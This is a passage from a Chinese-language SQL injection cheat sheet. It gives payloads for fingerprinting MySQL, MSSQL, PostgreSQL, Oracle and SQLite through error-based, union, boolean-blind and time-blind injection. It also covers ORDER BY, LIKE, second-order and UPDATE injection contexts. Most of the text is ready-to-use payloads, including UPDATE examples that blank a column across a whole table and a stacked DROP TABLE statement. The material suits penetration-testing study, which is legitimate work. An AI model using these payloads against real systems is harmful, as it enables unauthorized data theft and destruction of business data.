3、确认数据库版本、类型

```
根据有无回显可进行一下判断
一、有回显
1. 报错回显
数据库 | payload | 期望回显
MySQL/MariaDB | `AND extractvalue(1,concat(0x7e,version()))--+` | `XPATH syntax error: '~8.0...'`
MSSQL | `AND 1=CONVERT(int,@@version)--+` | `Conversion failed... Microsoft SQL Server`
PostgreSQL | `AND 1=CAST(version() AS int)--+` | `invalid input syntax for type integer: "PostgreSQL..."`
Oracle | `AND 1=TO_NUMBER((SELECT banner FROM v$version WHERE rownum=1))--+` | `ORA-01722` 或 `ORA-...`
SQLite | 报错少，优先联合/布尔 | -

2. 联合回显
先 `ORDER BY n`。
数据库 | payload | 期望
MySQL | `UNION SELECT 1,@@version,3--+` | 版本
MSSQL | `UNION SELECT 1,@@version,3--+` | Microsoft SQL Server
PostgreSQL | `UNION SELECT 1,version(),3--+` | PostgreSQL
Oracle | `UNION SELECT 1,(SELECT banner FROM v$version WHERE rownum=1),3 FROM dual--+` | Oracle
SQLite | `UNION SELECT 1,sqlite_version(),3--+` | 3.x
注意列数要匹配，`1,3` 是占位。

二、无回显
1. 布尔盲注（返回1/0）
数据库 | 真条件 payload | 说明
MySQL/MariaDB | `AND (SELECT @@version_comment) IS NOT NULL--+` | 1条
MSSQL | `AND (SELECT @@version) LIKE '%25Microsoft%25'--+` | 1条
PostgreSQL | `AND (SELECT version()) LIKE '%25PostgreSQL%25'--+` | 1条
Oracle | `AND (SELECT 1 FROM dual WHERE rownum=1)=1--+` | 1条
SQLite | `AND (SELECT COUNT(*) FROM sqlite_master)%3E=0--+` | 1条

2. 时间盲注
数据库 | payload | 说明
MySQL | `AND SLEEP(5)--+` | 延迟5秒
MSSQL | `'; WAITFOR DELAY '0:0:5'--+` | 需堆叠
PostgreSQL | `AND 1=(SELECT 1 FROM pg_sleep(5))--+` | 延迟5秒
Oracle | `AND 1=(SELECT DBMS_PIPE.RECEIVE_MESSAGE('a',5) FROM dual)--+` | 延迟5秒
SQLite | `AND 1=randomblob(100000000)--+` | 无sleep，靠计算延迟

三、速查：数据库特有指纹
- MySQL: `@@version_comment`, `#`, `/*!`, `SLEEP`
- MSSQL: `@@version` 含 Microsoft, `WAITFOR DELAY`, `CONVERT`
- PostgreSQL: `version()` 含 PostgreSQL, `pg_sleep`, `::int`
- Oracle: `dual`, `rownum`, `v$version`, `ORA-`
- SQLite: `sqlite_master`, `sqlite_version()`, `randomblob`

四、注意
- `%` 在 URL 中写 `%25`；`>` 写 `%3E`；`#` 写 `%23`；空格用 `+` 或 `%20`。
- 报错被吞时，报错法可能失效，用布尔/时间。
- 联合查询先判列数。
- 交叉验证，不要只靠一条。

```

4、根据场景区分order by类型、like类型、二次注入、查询、update注入

```sql
注意点：
1、orderby类型
orderby类型的不支持联合注入，只能通过堆叠注入、时间or布尔盲注、报错注入
具体可根据有无回显、报错信息进行灵活判断

2、like类型
like类型记得闭合的时候使用百分号

3、二次注入
比较考验经验
1、注册场景未进行预编译，导致注册恶意payload(admin'#),在登陆或者其他根据用户名从数据库拿数据的时候，造成sql注入
2、cookie、token等场景，如果都做了预编译处理，但是注册可以注册恶意用户名，且从数据库拿数据是根据cookie解析对应的用户名在去获取，照样存在注入风险

4、update更新用户数据
这个基本上就是堆叠注入或者子查询了，再后面用新的sql语句即可。同orderby，不支持union联合
update table set text='' or 1=1-- ' where name='xxx';
这条 payload非常危险：会更新全表所有行，把所有记录的 text 字段修改为空，直接破坏业务数据。
update table set text='' , text=(select version()) -- ' where name='xxx';
执行后，当前行 text 字段会被写入数据库版本号，实现**数据外带**（回显在该字段）。
update table set text=''; drop table test; -- ' where name='xxx';
分号结束 update，额外执行删表语句，毁灭性攻击。很多数据库驱动默认关闭堆叠查询
```

5、选择注入方法

```
根据有无回显进行选择
有回显
	联合注入
无回显，有报错
	报错注入
无回显、无报错、可判断成功
	布尔盲注
无回显、无报错、不可判断是否执行成功
	时间盲注
	进行时间盲注的时候，可尝试sleep是否执行成功
	eg:id=1 and sleep(5)
```
